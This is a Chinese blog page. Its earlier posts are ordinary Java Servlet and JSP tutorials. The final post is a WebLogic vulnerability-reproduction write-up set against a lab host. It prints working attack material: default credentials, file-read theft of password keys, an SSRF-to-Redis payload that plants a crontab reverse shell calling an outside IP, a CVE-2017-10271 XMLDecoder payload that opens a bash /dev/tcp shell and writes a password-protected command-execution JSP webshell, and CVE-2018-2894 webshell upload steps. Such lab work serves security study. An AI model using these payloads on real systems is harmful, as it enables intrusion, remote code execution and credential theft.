</code></pre><h5 id="获取请求消息头信息"><a href="#获取请求消息头信息" class="headerlink" title="获取请求消息头信息:"></a>获取请求消息头信息:</h5><pre><code>PrintWriter out = response.getWriter();

Enumeration headerNames = request.getHeaderNames();         

while(headerNames.hasMoreElements()) {
    String paramName = (String)headerNames.nextElement();
    String paramValue = request.getHeader(paramName);
    out.print(paramName+&quot;:&quot;+paramValue);
    out.print(&quot;&lt;br /&gt;&quot;);

}
</code></pre><p>先使用HttpServletRequest的getHeaderName()读取HTTP头信息,该方法返回一个枚举,包含与当前的HTTP请求相关的头信息,我们循环枚举,使用hasMoreElements()方法遍历即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-09.17.08.14-image.png" alt="2018-12-09.17.08.14-image.png"></p>
<h5 id="通过Request对象传递数据"><a href="#通过Request对象传递数据" class="headerlink" title="通过Request对象传递数据"></a>通过Request对象传递数据</h5><blockquote>
<p>Request对象不仅可以获取一系列数据,还可以使用属性传递数据,在ServletRequest接口中,定义了一系列操作属性的方法。</p>
</blockquote>
<p><code>request.setAttribute()</code>将一个对象与一个name关联存入<code>ServletRequest()</code>对象中,如果已经存在相同名字,则会删除原来的属性.如果设置对象值为<code>null</code>,则相当于<code>removeAttribute()</code></p>
<pre><code>Servlet：
request.setAttribute(&quot;list&quot;, list1);

Jsp:
&lt;jsp:include page=&apos;&lt;%=&quot;/ShowAllUser&quot; %&gt;&apos;&gt;&lt;/jsp:include&gt;
${list}  即可在Jsp中接收list

request.getAttribute(String name)  返回ServletRequest对象指定name的value    
request.removeAttribute(String name)  删除ServletRequest对象指定name的value    
request.getAttributeNames()    

    request.setAttribute(&quot;name&quot;, &quot;zhangsan&quot;);
    request.setAttribute(&quot;pwd&quot;, &quot;123&quot;);
    Enumeration aa = request.getAttributeNames();

    while(aa.hasMoreElements()) {
        String name = (String) aa.nextElement();  //name
        Object str = request.getAttribute(name);  //对象
        out.print(name+&quot;:&quot;+str+&quot;&lt;br /&gt;&quot;);

    }
</code></pre><h5 id="RequestDispatcher接口"><a href="#RequestDispatcher接口" class="headerlink" title="RequestDispatcher接口"></a>RequestDispatcher接口</h5><p>当一个Web资源收到客户端的请求时,如果希望服务器通知另一个资源区处理请求,除了使用<code>response.sendRedirect()</code>,还可以使用RequestDispatcher接口实例化对象区实现。    </p>
<h5 id="请求转发-forward"><a href="#请求转发-forward" class="headerlink" title="请求转发 forward()"></a>请求转发 forward()</h5><blockquote>
<p>请求转发完给其他资源,其他WEB资源处理完请求后,直接将响应结果返回给客户端。(该方法需在提交给客户端之前调用,否则会出现错误)        </p>
</blockquote>
<pre><code>RequestDispatcher dispatcher = request.getRequestDispatcher(&quot;/TestServlet03&quot;);
dispatcher.forward(request, response);   //返回TestServlet03的输出信息
</code></pre><h5 id="请求包含-incule"><a href="#请求包含-incule" class="headerlink" title="请求包含 incule()"></a>请求包含 incule()</h5><blockquote>
<p>请求包含指的是使用include()方法将Servlet请求转发到其他Web资源进行处理,与请求转发不同,Servlet与WEB资源都返回消息给客户端（关于编码,需在Servlet设置）</p>
</blockquote>
<pre><code>RequestDispatcher dispatcher = request.getRequestDispatcher(&quot;/TestServlet03&quot;);
dispatcher.include(request, response);   //返回TestServlet02与TestServlet03的输出信息
</code></pre><h4 id="HttpServletResponse对象"><a href="#HttpServletResponse对象" class="headerlink" title="HttpServletResponse对象"></a>HttpServletResponse对象</h4><p>a.setStatus(int status)方法    设置返回状态码(默认为200)<br>b.sendError(int sc)方法    用于发送表示错误信息的状态码。</p>
<pre><code>public void sendError(int code) throws java.io.IOException  //只返回状态码
public void sendError(int code,String message) throws java.io.IOException //返回加提示信息
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-09.16.50.22-image.png" alt="2018-12-09.16.50.22-image.png"><br>c.发送响应消息头相关的方法:</p>
<pre><code>addHeader(String name,String value)   //增加同名响应头
setHeader(String name,String value)   //覆盖同名响应头

addIntHeader(String name,int value)   //设置valu值为int类型的参数,避免使用addHeader需要转换String的麻烦
setIntHeader(String name,int value)    

setContentLength(int len)   //设置响应消息的实体内容的大小
setContentType(String type)  //设置Servlet输出内容的MIME类型

setCharacterEncoding(String charset)   //设置输出内容使用的字符编码


eg:response.setHeader(&quot;refresh&quot;,&quot;3;URL=http://www.baidu.com&quot;);  //定时刷新并跳转
</code></pre><p>d.发送响应消息体相关的方法:</p>
<pre><code>ServletOutputStream out = response.getOutputStream(); //输出字节数组中的二进制数据
out.write(data.getBytes());               //使用当前文件的编码格式输出

response.getWriter().write(data);   
</code></pre><p>两者互相排斥,不可同时使用。(设计原因) 只能输出字节流或字符流。</p>
<p>e.实现请求重定向:</p>
<pre><code>response.sendRedirect(&quot;login.html&quot;);   //重定向到login.html
</code></pre><h4 id="解决乱码问题"><a href="#解决乱码问题" class="headerlink" title="解决乱码问题"></a>解决乱码问题</h4><pre><code>request.setCharacterEncoding(&quot;UTF-8&quot;);   //使接收的参数值为utf-8格式
response.setContentType(&quot;text/html;charset=utf-8&quot;);  //返回的信息为utf-8
PrintWriter out = response.getWriter();   //在response.getWriter()前设置编码
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/java_web_JSP技术/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/19/java_web_JSP技术/" itemprop="url">基础知识 | JSP基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T08:15:41+08:00">
                2018-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
<p>JSP = HTML + Java代码 + JSP标签<br>  Java代码:Java脚本 声明 表达式<br>  JSP标签:指令 动作 注释    </p>
</blockquote>
<h4 id="JSP脚本元素"><a href="#JSP脚本元素" class="headerlink" title="JSP脚本元素"></a>JSP脚本元素</h4><p>脚本元素主要包含3种类型:</p>
<blockquote>
<p>脚本程序:&lt;% %&gt;<br>脚本程序可以包含任意量的Java语句、变量、方法或表达式(局部变量 用完即销毁 刷新)<br>声明语句:&lt;%! %&gt;<br>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们(类变量 存在内存)<br>表达式:&lt;%= %&gt;<br>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。无引号</p>
</blockquote>
<p>例子:</p>
<pre><code>#
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;ISO-8859-1&quot;&gt;
&lt;title&gt;JSP title&lt;/title&gt;
&lt;/head&gt;
&lt;%!//声明语句 定义2个变量及一个print方法
    int a=1,b=2;
%&gt;
&lt;%! public String print(){
    String str = &quot;itcast&quot;;
    return str;
} %&gt;
&lt;body&gt;
&lt;% 
    out.print(a + b); //JSP脚本元素 输出a+b
%&gt;
&lt;br /&gt;
&lt;% 
    out.print(print()); //运行print()函数
%&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>总之,<code>&lt;%! %&gt;</code>是用来定义成员变量属性及方法的,<code>&lt;% %&gt;</code>主要用来输出内容的,因此,如果涉及了成员变量的操作,就应该使用<code>&lt;%! %&gt;</code>,而如果涉及到了输出内容,就应该使用<code>&lt;% %&gt;</code></p>
<p>JSP表达式,将刚才代码的<code>body</code>段改为如下即可:</p>
<pre><code>&lt;body&gt;
&lt;%= a+b %&gt;
&lt;br /&gt;
&lt;%= print() %&gt;
&lt;/body&gt;
</code></pre><p><code>&lt;%= %&gt;</code>之间只能插入表达式,不能插入语句。且最后无分号(<code>;</code>)</p>
<p>JSP注释(JSP的注释不会发送到前端)</p>
<pre><code>&lt;%--this is notes--%&gt;
</code></pre><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>page指令:</p>
<pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
//contentType是给浏览器看的,使其按照text/html进行解释  pageEncoding是给servlet看的
还有属性import=&quot;&quot; session=&quot;true&quot; errorPage=&quot;&quot;(错误页面) iserrorpage=&quot;true&quot;(本页面就是错误页面),只有import可以出现多次 其他都只能出现一次
</code></pre><p>include指令:</p>
<pre><code>&lt;%@ include file=&quot;date.jsp&quot;  %&gt; //引入date.jsp 将其代码合并到demo.jsp中

#date.jsp
&lt;% out.println(new java.util.Date().toLocaleString()); %&gt;

//文件路径一般用相对路径,开发后期移动方便   绝对路径:/开头
</code></pre><p>taglib指令：引入标签库的定义,可以是自定义标签</p>
<h4 id="JSP隐式对象"><a href="#JSP隐式对象" class="headerlink" title="JSP隐式对象"></a>JSP隐式对象</h4><p>1.out对象    </p>
<pre><code>&lt;%
    out.println(&quot;first line&lt;br /&gt;&quot;);  //out.print(&quot;first line&lt;br /&gt;&quot;);也可以
    out.println(out.getBufferSize()); //输出缓冲区大小
    response.getWriter().println(&quot;second line&lt;br /&gt;&quot;);

%&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-08.21.44.30-image.png" alt="2018-11-08.21.44.30-image.png"></p>
<p>我们可发现<code>out.println()</code>在前面,但它的输出内容却在后面。因为out对象通过print语句写入数据后,直到整个JSP页面结束,才会写入缓冲区输出,而<code>response.getWrite.println()</code>则是直接把内容写入<code>Servlet</code>引擎提供的缓冲区中。<code>Servlet</code>引擎按照缓冲区的数据存放顺序输出内容。<br>有时候我们希望<code>out</code>对象可以直接将数据写入缓冲区进行输出,我们可通过<code>page</code>的<code>buffer</code>属性来实现</p>
<pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; buffer=&quot;0kb&quot;%&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-08.21.51.50-image.png" alt="2018-11-08.21.51.50-image.png"></p>
<p>这样就直接写入了。</p>
<p>2.pageContext</p>
<p>下面的几种是隐式对象,同时也是页面间数据共享范围<br>            范围                         有效期<br>    3.page: 当前页面                    当前页面<br>    4.request: 两两页面之间              当前请求站点<br>    5.session: 所有页面都共享 单用户      浏览器启动-浏览器关闭<br>    6.application: 所有页面,所有用户     服务器不关闭</p>
<pre><code>&lt;% session.setAttribute(&quot;str&quot;, &quot;hello&quot;); %&gt;
&lt;% out.println(session.getAttribute(&quot;str&quot;)); %&gt;   
先访问set的文件,然后str存入session中,再访问get的页面,取出str值。
</code></pre><p>7.exception对象</p>
<pre><code>#exception.jsp
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; errorPage=&quot;error.jsp&quot;%&gt;
//errorPage表明错误文件
...
&lt;body&gt;
&lt;% int a=3;
   int b=0; 
%&gt;
&lt;%= (a/b) %&gt;
&lt;/body&gt;

#error.jsp
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; isErrorPage=&quot;true&quot;%&gt;
//isErrorPage表明当前页面为错误跳转页面
&lt;body&gt;
this is error;
&lt;%= exception.getMessage() %&gt;&lt;br /&gt;
&lt;/body&gt;
</code></pre><p>说明exception.jsp发生错误时,会自动调用error.jsp页面进行处理</p>
<p>还有两种分别为config与response对象<br>其他参考<a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">JSP隐式对象</a></p>
<h4 id="JSP行为"><a href="#JSP行为" class="headerlink" title="JSP行为"></a>JSP行为</h4><p><strong><a href="jsp:include" target="_blank" rel="noopener">jsp:include</a></strong>:将其他资源的输出内容插入到当前页面的输出内容中。<br>元素语法:<code>&lt;jsp:include page=&quot;文件路径&quot; flush=&quot;false|true&quot;&gt;</code></p>
<pre><code>#test_include.jsp内容:
&lt;body&gt;
test_include的中文
&lt;br /&gt;
&lt;jsp:include page=&quot;include.jsp&quot; flush=&quot;true&quot; /&gt;
&lt;body&gt;

#include.jsp内容:
&lt;body&gt;
    &lt;% Thread.sleep(5000); %&gt;
    include文件的中文
&lt;/body&gt;
</code></pre><p>访问<code>127.0.0.1:8080/test_dynamic/test_include.jsp</code>,页面会先显示<code>test_include的中文</code>,然后等待5s显示<code>include文件的中文</code>。<br>若flush的属性值为false(默认),再次访问,则会等待5s后,2行内容一起显示出来。<br>与include的区别:</p>
<pre><code>a.&lt;jsp:include&gt;的文件与被包含文件是2个独立的文件,被包含文件的内容必须能被WEB容器独立执行。而include的内容只需要遵循JSP文件格式,包含与被包含文件是一个整体,需要合并才能翻译成一个Servlrt文件
b.&lt;jsp:include&gt;标签引入的资源是在运行时才包含的,而且只包含运行结果,而include引入的资源是在编译时包含的,包含的是源代码
c.&lt;jsp:include&gt;标签运行原理与RequestDispatcher.include()方法类似,即被包含的页面不能改变响应状态码及设置响应头,而include
指令没有这方面的限制。
</code></pre><p><strong><a href="jsp:forward" target="_blank" rel="noopener">jsp:forward</a></strong>:当前请求转发到其他WEB资源,在执行请求转发后的当前页面将不再执行<br>元素语法:<code>&lt;jsp:forward page=&quot;文件路径&quot; /&gt;</code>        </p>
<pre><code>#jspforward.jsp
&lt;jsp:forward page=&quot;date.jsp&quot;&gt;&lt;/jsp:forward&gt;
&lt;% out.println(1); %&gt; //不执行了

#date.jsp
&lt;% out.println(new java.util.Date().toLocaleString()); %&gt; //输出当前时间
</code></pre><p>由于请求转发是服务端的操作,浏览器并不知道请求页面,所以浏览器的地址栏不会变化(jspforward.jsp)    </p>
<p>其他JSP行为请参考:<a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">JSP行为</a></p>
<p>判断语句:</p>
<pre><code>&lt;h3&gt;if....else例子&lt;/h3&gt;
&lt;% if (day == 1 | day == 7) { %&gt;
      &lt;p&gt;今天是周末&lt;/p&gt;
&lt;% } else { %&gt;
      &lt;p&gt;今天不是周末&lt;/p&gt;
&lt;% } %&gt;
&lt;/body&gt;
</code></pre><p><a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">http://www.runoob.com/jsp/jsp-syntax.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/12/Weblogic 漏洞复现/" itemprop="url">Weblogic 漏洞复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-12T08:15:41+08:00">
                2018-11-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><p>访问漏洞url：</p>
<pre><code>https://cirt.net/passwords?criteria=weblogic
默认账号密码:weblogic  Oracle@123
</code></pre><p>访问<code>console</code>进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。<br>这里提供了一个前台文件读取,访问<code>http://192.168.181.129:7001/hello/file.jsp?path=/etc/passwd</code>,在浏览器访问可直接下载,在burp中可对文件进行读取。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.33.47-image.png" alt="2018-11-11.15.33.47-image.png"></p>
<h4 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h4><p>Weblogic密码使用AES(老版本3DES)加密,对称加密可解密,只需要找到用户的密文及加密密钥即可。这两个文件均位于<code>base_domain</code>下,名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>,在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>(基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>)<br>读取密钥:<br><code>SerializedSystemIni.dat</code>是一个二进制文件,所以必须用burp进行读取,浏览器直接下载可能造成乱码,我们在burp中右键保存为文件即可<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.26.48-image.png" alt="2018-11-11.15.26.48-image.png"></p>
<p>读取密文:<br><code>config.xml</code>是base_domain的全局配置文件,其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值即为加密后的管理员密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.28.21-image.png" alt="2018-11-11.15.28.21-image.png"></p>
<p>解密:</p>
<pre><code>1.dat文件
{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=
</code></pre><p>登陆上去部署getshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.52.53-image.png" alt="2018-11-11.16.52.53-image.png"></p>
<p>点击安装后,选择上载文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.54.10-image.png" alt="2018-11-11.16.54.10-image.png"></p>
<p>打包war文件(当前目录下有shell文件z.jsp)    </p>
<pre><code>jar -cvf zzz.war *
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.56.15-image.png" alt="2018-11-11.16.56.15-image.png"></p>
<p>得到war文件,上载成功后一直点下一步至完成即可<br>最后得到:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.57.55-image.png" alt="2018-11-11.16.57.55-image.png"></p>
<p>访问我们的shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.50.54-image.png" alt="2018-11-11.16.50.54-image.png"></p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>访问漏洞地址:    </p>
<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp
</code></pre><p>服务存在:    </p>
<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7001
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.37.33-image.png" alt="2018-11-11.11.37.33-image.png"></p>
<p>服务不存在:    </p>
<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7002    
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.38.55-image.png" alt="2018-11-11.11.38.55-image.png"></p>
<p>通过内网探测redis服务器,(docker的网段一般是<code>172.*</code>),发现<code>172.21.0.2:6379</code>可以连通。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.47.34-image.png" alt="2018-11-11.11.47.34-image.png"></p>
<p>redis服务存在,我们可利用ssrf攻击内网中的redis服务器来反弹shell(<code>%0D%0A</code>分割命令)    </p>
<p>发送3条命令：    </p>
<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/22 0&gt;&amp;1\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save
</code></pre><p>经过url编码:    </p>
<pre><code>aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
</code></pre><p>payload：    </p>
<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.21.0.2:6379/aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
</code></pre><p>成功反弹shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.30.17-image.png" alt="2018-11-11.12.30.17-image.png"></p>
<h2 id="XMLDecoder反序列化漏洞-CVE-2017-10271"><a href="#XMLDecoder反序列化漏洞-CVE-2017-10271" class="headerlink" title="XMLDecoder反序列化漏洞_CVE-2017-10271"></a>XMLDecoder反序列化漏洞_CVE-2017-10271</h2><p>访问url:    </p>
<pre><code>http://192.168.181.129:7001/wls-wsat/CoordinatorPortType
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.54.09-image.png" alt="2018-11-11.12.54.09-image.png"><br>看到这个页面,则说明可能存在此漏洞    </p>
<p>构造数据包:    </p>
<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.181.129:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
Connection: close
Content-Type: text/xml
Content-Length: 637

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
&lt;void index=&quot;0&quot;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/22 0&amp;gt;&amp;amp;1&lt;/string&gt;  
&lt;/void&gt;
&lt;/array&gt;
&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><p>注意:    </p>
<pre><code>Content-Type: text/xml
</code></pre><p>反弹shell成功：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.56.33-image.png" alt="2018-11-11.12.56.33-image.png"></p>
<p>写shell:    </p>
<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.181.129:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
Connection: close
Content-Type: text/xml
Content-Length: 637

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
    &lt;![CDATA[
&lt;%
if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))
{
    java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;z&quot;)).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1)
    {
        out.println(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);
}
%&gt;
    ]]&gt;
    &lt;/string&gt;
    &lt;/void&gt;
    &lt;void method=&quot;close&quot;/&gt;
    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
    &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><p>然后带密码访问:    </p>
<pre><code>http://192.168.181.129:7001/bea_wls_internal/test.jsp
POST:pwd=123&amp;z=ipconfig
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.14.59.13-image.png" alt="2018-11-11.14.59.13-image.png"></p>
<h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p>需要开启Web Service Test Page,但是默认是不开启的,所以有一定的限制,利用该漏洞可直接上传webshell,获取服务器权限</p>
<p>在docker中查看管理员密码:</p>
<pre><code>docker-compose logs | grep password
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.44.08-image.png" alt="2018-11-11.17.44.08-image.png"></p>
<p>得到账户密码:</p>
<pre><code>weblogic     nnXPlDo0
</code></pre><p>访问<code>http://192.168.181.129:7001/console</code><br>点击<code>base_domain</code>配置,在高级中开启<code>&quot;启用Web服务测试页&quot;</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.41.24-image.png" alt="2018-11-11.17.41.24-image.png"></p>
<p>点击保存后,访问<code>http://192.168.181.129:7001/ws_utc/config.do</code><br>将<code>Work Home Dir</code>改为:<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。访问这个目录是不需要权限的。这一点对我们访问我们的shell文件很重要。    </p>
<p>保存完成后,点击<code>安全</code>–&gt;增加,然后上传webshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.51.55-image.png" alt="2018-11-11.17.51.55-image.png"></p>
<p>上传查看返回包,得到时间戳(后面会用)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.38.58-image.png" alt="2018-11-11.17.38.58-image.png"></p>
<p>访问我们的shell:</p>
<pre><code>http://192.168.181.129:7001/ws_utc/css/config/keystore/1541928959531_z.jsp
pwd=023&amp;z=id
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.39.26-image.png" alt="2018-11-11.17.39.26-image.png"></p>
